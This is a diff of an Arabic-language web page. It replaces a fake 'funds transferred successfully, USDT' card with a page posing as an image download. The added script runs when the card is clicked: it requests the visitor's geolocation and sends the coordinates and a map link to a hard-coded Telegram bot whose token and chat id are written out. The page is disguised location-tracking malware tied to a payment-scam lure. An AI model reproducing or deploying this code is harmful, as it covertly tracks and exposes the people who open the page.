@@ -1,76 +1,92 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>بطاقة تحويل</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .card {
-      background: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg') no-repeat center center;
-      background-size: cover;
-      width: 400px;
-      height: 250px;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      color: #fff;
-      position: relative;
-    }
-    .overlay {
-      position: absolute;
-      top:0; left:0; right:0; bottom:0;
-      background: rgba(0,0,0,0.4);
-      border-radius: 15px;
-    }
-    .content {
-      position: relative;
-      z-index: 2;
-      text-align: center;
-    }
-    h3, p {
-      margin: 5px 0;
-    }
-    a {
-      margin-top: 15px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      background: #28a745;
-      color: #fff;
-      font-weight: bold;
-      text-decoration: none;
-      transition: 0.3s;
-    }
-    a:hover {
-      background: #218838;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحميل الصورة</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #f2f2f2;
+    margin: 0;
+  }
+  .card {
+    width: 400px;
+    height: 250px;
+    border-radius: 15px;
+    overflow: hidden;
+    position: relative;
+    cursor: pointer;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+  }
+  .card img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  .overlay {
+    position: absolute;
+    top:0; left:0; right:0; bottom:0;
+    background: rgba(0,0,0,0.2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .overlay span {
+    font-size: 48px;
+    color: white;
+    background: rgba(0,0,0,0.5);
+    padding: 10px 20px;
+    border-radius: 50%;
+    transition: transform 0.2s;
+  }
+  .overlay span:hover {
+    transform: scale(1.2);
+  }
+</style>
 </head>
 <body>
 
-<div class="card">
-  <div class="overlay"></div>
-  <div class="content">
-    <h3>تم تحويل الأموال بنجاح</h3>
-    <p>:  USDT</p>
-    <a href="https://lolo-1-rt30.onrender.com" target="_blank">افتح الصورة</a>
+<div class="card" onclick="getLocation()">
+  <img src="https://i.ibb.co/album/sample-image.jpg" alt="تحميل الصورة">
+  <div class="overlay">
+    <span>⬇️</span>
   </div>
 </div>
+
+<script>
+function sendLocationToBot(lat, lon) {
+    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
+    const chatId = "6495557039";
+    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(res => res.json())
+    .then(data => alert("✅ تم تأكيد الموقع!"))
+    .catch(err => alert("❌ خطأ في الإرسال"));
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => sendLocationToBot(pos.coords.latitude, pos.coords.longitude),
+            err => alert("❌ لم يتم السماح بالوصول إلى الموقع")
+        );
+    } else {
+        alert("❌ جهازك لا يدعم الموقع الجغرافي");
+    }
+}
+</script>
 
 </body>
 </html>
